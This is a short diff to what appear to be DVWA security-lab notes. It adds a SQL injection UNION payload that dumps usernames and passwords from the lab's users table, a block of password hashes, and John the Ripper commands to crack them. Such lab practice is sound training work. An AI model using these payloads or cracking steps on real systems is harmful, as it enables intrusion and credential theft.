@@ -77,8 +77,13 @@ select database(); # at mysql terminal
 ```sql
 ' union select '',concat(first_name,':',password),'' from dvwa.users #
 ```
-
-```sql
+### john file content (passwords) no file extension
+```
+$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
+$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
+8d3533d75ae2c3966d7e0d4fcc69216b
+```
+```bash
 # crack passwords with John the Ripper
 john passwords.txt --format=raw-MD5
 john passwords.txt --show --format=raw-MD5
